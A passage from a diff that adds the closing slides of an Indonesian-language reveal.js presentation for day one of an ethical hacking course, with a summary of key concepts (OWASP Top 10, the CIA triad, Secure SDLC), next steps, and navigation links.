+            </section>
+
+            <!-- Summary -->
+            <section>
+                <h2>Ringkasan Day 1</h2>
+                <div class="success">
+                    <h3>Key Takeaways:</h3>
+                    <ul>
+                        <li>Ethical hacking adalah praktik legal untuk meningkatkan keamanan</li>
+                        <li>Metodologi ethical hacking mengikuti pendekatan sistematis</li>
+                        <li>OWASP Top 10 memberikan framework untuk memahami risiko keamanan web</li>
+                        <li>CIA Triad adalah dasar keamanan komputer</li>
+                        <li>Secure SDLC mengintegrasikan keamanan ke dalam setiap fase development</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Next Steps -->
+            <section>
+                <h2>Next Steps</h2>
+                <ul>
+                    <li>Review semua dokumentasi yang telah dibuat</li>
+                    <li>Siapkan environment untuk praktik Day 2</li>
+                    <li>Install tools yang diperlukan (PHP, MySQL, text editor)</li>
+                </ul>
+                <div class="info" style="margin-top: 30px;">
+                    <p><strong>Praktik:</strong> Buat dokumentasi ethical hacking, metodologi checklist, dan threat model untuk aplikasi web sederhana</p>
+                </div>
+            </section>
+
+            <!-- Navigation -->
+            <section class="center">
+                <h2>Terima Kasih!</h2>
+                <p style="margin-top: 50px;">
+                    <a href="day-02.html">→ Lanjut ke Day 2</a>
+                </p>
+                <p style="margin-top: 30px;">
+                    <a href="index.html">← Kembali ke Menu Utama</a>
+                </p>
+            </section>
+
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.3.1/dist/reveal.js"></script>
+    <script>
+        Reveal.initialize({
+            hash: true,
+            controls: true,
+            progress: true,
+            center: false,
+            transition: 'slide',
+            slideNumber: true
+        });
+    </script>
+</body>
+</html>
+
